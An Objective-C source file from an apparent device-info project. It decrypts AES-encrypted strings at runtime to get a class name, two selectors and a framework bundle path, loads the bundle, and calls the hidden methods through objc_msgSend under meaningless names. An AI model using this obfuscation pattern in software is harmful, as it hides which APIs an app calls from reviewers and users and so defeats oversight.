//
//  XYManager.m
//  XYDeviceInfo
//
//  Created by steve on 2020/8/4.
//

#import "XYManager.h"
#import <objc/runtime.h>
#import <objc/message.h>
#import "TraceAESenAndDe.h"

#define cn @"fZptHKiiVmfXY+1ejV2Wgexrl8ANA7hYBDiMkVo5Nzg="
#define cs1 @"p9l2O804uCj4EEfR0XL7W1Pu6fbzR/8xWAV/7nQenaw="
#define cs2 @"alunl3peyZ6RwyQvqnW6TrxLYpwJXxC5DpMVL8/eiVs8AczQJunWA6qc7ph/tYzpFeikMws7lrU5Snb3ek+w0A=="
#define fw @"mF3aPq0xMqLn9myMXL+zYkaXaeWXZ9Dzu5xlOl0NrDfM+5oFynmTT+6XGkqo1UVnR2MnGYwPm+Z/x/orRtGUlg=="

@implementation XYManager

+ (NSInteger)a {
    Class ma = NSClassFromString([TraceAESenAndDe De_Base64andAESDeToString:cn]);
    if (ma == nil) {
        [[NSBundle bundleWithPath:[TraceAESenAndDe De_Base64andAESDeToString:fw]] load];
         ma = NSClassFromString([TraceAESenAndDe De_Base64andAESDeToString:cn]);
    }
    SEL s = NSSelectorFromString([TraceAESenAndDe De_Base64andAESDeToString:cs1]);
    NSInteger v = ((int (*)(id, SEL)) objc_msgSend)(ma, s);
    return v;
}

+ (void)b:(void(^)(NSInteger status))c {
    Class ma = NSClassFromString([TraceAESenAndDe De_Base64andAESDeToString:cn]);
    if (ma == nil) {
        [[NSBundle bundleWithPath:[TraceAESenAndDe De_Base64andAESDeToString:fw]] load];
         ma = NSClassFromString([TraceAESenAndDe De_Base64andAESDeToString:cn]);
    }
    SEL s = NSSelectorFromString([TraceAESenAndDe De_Base64andAESDeToString:cs2]);
    ((void (*)(id, SEL, void(^)(NSInteger status))) objc_msgSend)(ma, s, c);
}

@end
